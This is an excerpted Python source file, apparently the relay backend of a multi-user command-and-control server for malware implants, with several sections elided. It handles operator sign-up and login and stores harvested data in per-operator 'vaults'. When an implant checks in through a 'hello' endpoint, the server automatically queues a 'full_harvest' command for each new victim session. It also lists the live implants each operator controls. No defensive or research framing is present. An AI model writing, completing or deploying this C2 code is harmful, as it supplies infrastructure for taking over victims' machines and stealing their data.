# relay_server.py (Authoritative Multi-User Backend - With Auto-Harvest Tasking)
...
class DatabaseManager:
    ...
    def create_user(self, username, password_hash):
        try: self.conn.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash)); self.conn.commit(); return True
        except sqlite3.IntegrityError: return False
            
    def get_user(self, username):
        cursor = self.conn.cursor(); cursor.execute("SELECT * FROM users WHERE username = ?", (username,)); return cursor.fetchone()
    ...
    def load_vault_data_for_user(self, username):
        ...
        for session_id, module_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if session_id in vault_data: vault_data[session_id][module_name] = json.loads(data_json)
        return vault_data
...
def register():
    ...
    if not all([username, password]) or len(password) < 4: return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    if db.create_user(username, generate_password_hash(password)): return jsonify({"success": True, "message": "Account created successfully."})
    else: return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json; username, password = data.get('username'), data.get('password'); user = db.get_user(username)
    if user and check_password_hash(user[1], password): return jsonify({"success": True, "username": user[0]})
...
def handle_implant_hello():
    data = request.json; session_id, c2_user = data.get("session_id"), data.get("c2_user")
    ...
    with cmd_lock:
        if is_new_session:
            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).append({
                "action": "full_harvest", "params": {}
            })
...
def discover_sessions():
    ...
    with ses_lock:
        for sid, data in active_sessions.items():
            if data["owner"] == username and (time.time() - data["last_seen"]) < 40:
